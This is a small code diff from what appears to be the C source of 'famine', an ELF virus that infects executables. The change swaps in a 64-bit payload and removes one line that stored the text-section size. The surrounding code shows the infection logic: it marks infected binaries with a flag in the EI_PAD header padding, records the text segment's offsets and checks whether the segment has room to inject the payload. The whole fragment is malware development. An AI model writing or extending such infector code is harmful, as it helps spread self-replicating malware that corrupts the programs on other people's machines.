@@ -15,7 +15,7 @@
 void choose_infection_method(t_famine *famine)
 {
     set_string_table_ptr(famine);
-    load_payload(famine, PAYLOAD_NAME);
+    load_payload(famine, PAYLOAD_NAME_64);
 
     // Set a flag in the EI_PAD header padding that indicate the file have been infected.
     famine->ehdr->e_ident[EI_PAD + 3] = 7;
@@ -28,7 +28,6 @@ void choose_infection_method(t_famine *famine)
             famine->text_p_start_offset = famine->phdr[i].p_offset;
             famine->text_p_end_offset = famine->phdr[i].p_offset + famine->phdr[i].p_filesz;
             famine->text_p_size = famine->phdr[i].p_filesz;
-            famine->text_section_size = famine->phdr[i].p_filesz;
             famine->text_p_vaddr = famine->phdr[i].p_vaddr;
 
             // Check if there is enought space for our payload in the text section.
